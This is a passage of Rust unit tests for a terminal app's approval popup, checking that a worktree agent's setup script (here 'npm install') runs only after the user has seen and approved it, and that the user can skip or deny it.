    fn a_screen_too_small_to_show_the_script_refuses_approval_but_not_skipping() {
        let (mut app, _dir) = with_setup("npm install");
        app.set_screen_size(60, 6);
        let _ = submit_worktree_agent(&mut app);
        assert!(app.on_key(key('y')).is_empty());
        let _ = app.on_key(key('G'));
        assert!(app.on_key(key('y')).is_empty());
        assert!(matches!(app.popup, Some(Popup::ApproveSetup { .. })));
        app.set_screen_size(60, 20);
        assert!(!app.on_key(key('y')).is_empty());

        let (mut app, _dir) = with_setup("npm install");
        app.set_screen_size(60, 6);
        let _ = submit_worktree_agent(&mut app);
        assert_eq!(created_setup(&app.on_key(key('s'))), Some(None));
    }

    #[test]
    fn a_tall_script_can_be_denied_at_any_time() {
        for deny in [key('n'), code(KeyCode::Esc)] {
            let (mut app, _dir) = with_setup(&tall_script());
            app.set_screen_size(60, 20);
            let _ = submit_worktree_agent(&mut app);
            assert!(app.on_key(deny).is_empty());
            assert_eq!(app.popup, None);
        }
    }

    #[test]
    fn s_creates_without_the_setup_and_n_creates_nothing() {
        let (mut app, _dir) = with_setup("npm install");
        let _ = submit_worktree_agent(&mut app);
        let effects = app.on_key(key('s'));
        assert_eq!(created_setup(&effects), Some(None));
        assert!(
            !effects
                .iter()
                .any(|e| matches!(e, Effect::ApproveSetup { .. }))
        );

        let (mut app, _dir) = with_setup("npm install");
        let _ = submit_worktree_agent(&mut app);
        assert!(app.on_key(key('n')).is_empty());
        assert_eq!(app.popup, None);
    }

    #[test]
    fn a_plain_agent_never_runs_the_setup() {
        let (mut app, _dir) = with_setup("npm install");
        let _ = app.on_key(key('n'));
        let effects = app.on_key(code(KeyCode::Enter));
        assert_eq!(created_setup(&effects), Some(None));
    }
}
